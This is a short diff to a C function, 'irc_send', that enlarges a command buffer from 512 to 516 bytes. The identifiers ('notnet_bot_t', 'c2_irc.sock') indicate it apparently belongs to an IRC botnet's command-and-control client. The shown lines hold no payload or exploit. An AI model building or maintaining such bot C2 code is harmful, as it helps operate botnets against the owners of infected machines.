@@ -154,7 +154,7 @@ int irc_send(notnet_bot_t *bot, const char *format, ...) {
     va_end(args);
     
     /* Ensure IRC protocol termination */
-    char full_cmd[512];
+    char full_cmd[516];
     snprintf(full_cmd, sizeof(full_cmd), "%s\r\n", buf);
     
     int sent = send(bot->c2_irc.sock, full_cmd, strlen(full_cmd), 0);
